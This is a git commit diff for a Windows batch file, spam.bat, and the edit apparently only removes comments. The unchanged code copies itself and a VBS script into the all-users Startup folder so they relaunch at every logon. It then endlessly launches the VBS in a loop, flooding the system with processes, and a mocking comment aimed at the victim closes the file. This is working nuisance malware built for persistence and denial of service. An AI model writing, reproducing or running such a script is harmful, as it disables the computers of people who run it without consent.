0a3d273d0943c03c04f8ef62537813b5e3d38a89
Nex <87149262+LukeChemeriov@users.noreply.github.com>
2021-11-16 17:20:35 +0000

    Update spam.bat
    Got rid of comments (except the last one because that's funny)

--- spam.bat
+++ spam.bat
@@ -1,12 +1,12 @@
 @ echo off
 xcopy spam.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\spam.bat
 xcopy cykablyat.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cykablyat.vbs
-rem sleep for 10 seconds
 ping -n 11 127.0.0.1>nul
-rem SPAM CYKA BLYAT
 :looperobject
 start cykablyat.vbs
 goto looperobject
+
+
 
 
 rem HA SUCK ON THAT CYKA
